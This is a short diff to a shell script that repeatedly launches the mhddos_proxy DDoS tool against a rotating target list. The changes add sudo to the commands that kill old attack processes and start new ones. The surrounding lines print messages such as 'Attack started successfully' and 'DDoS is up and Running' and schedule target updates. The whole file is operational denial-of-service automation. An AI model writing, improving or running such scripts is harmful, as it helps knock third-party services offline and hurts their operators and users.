@@ -10,8 +10,8 @@ ulimit -n 1048576
 
 #Just in case kill previous copy of mhddos_proxy
 echo -e "[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - Killing all old processes with MHDDoS"
-pkill -e -f runner.py
-pkill -e -f ./start.py
+sudo pkill -e -f runner.py
+sudo pkill -e -f ./start.py
 echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[0;35mAll old processes with MHDDoS killed\033[0;0m\n"
 # for Docker
 #echo "Kill all useless docker-containers with MHDDoS"
@@ -88,11 +88,11 @@ do
            
 
             echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - full cmd:\n"
-            echo "python3 runner.py $cmd_line $proxy_interval --rpc $rpc -t $threads $debug"
+            echo "sudo python3 runner.py $cmd_line $proxy_interval --rpc $rpc -t $threads $debug"
             
             cd ~/mhddos_proxy
             #sudo docker run -d -it --rm --pull always ghcr.io/porthole-ascend-cinnamon/mhddos_proxy:latest $cmd_line $proxy_interval $rpc
-            python3 runner.py $cmd_line $proxy_interval --rpc $rpc -t $threads $debug&
+            sudo python3 runner.py $cmd_line $proxy_interval --rpc $rpc -t $threads $debug&
             echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[42mAttack started successfully\033[0m\n"
    	done
    	echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[1;35mDDoS is up and Running, next update of targets list in $restart_interval ...\033[1;0m"
@@ -101,8 +101,8 @@ do
    	
    	#Just in case kill previous copy of mhddos_proxy
    	echo -e "[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - Killing all old processes with MHDDoS"
-   	pkill -e -f runner.py
-   	pkill -e -f ./start.py
+   	sudo pkill -e -f runner.py
+   	sudo pkill -e -f ./start.py
    	echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[0;35mAll old processes with MHDDoS killed\033[0;0m\n"
 	
    	no_ddos_sleep="$(shuf -i 2-6 -n 1)m"
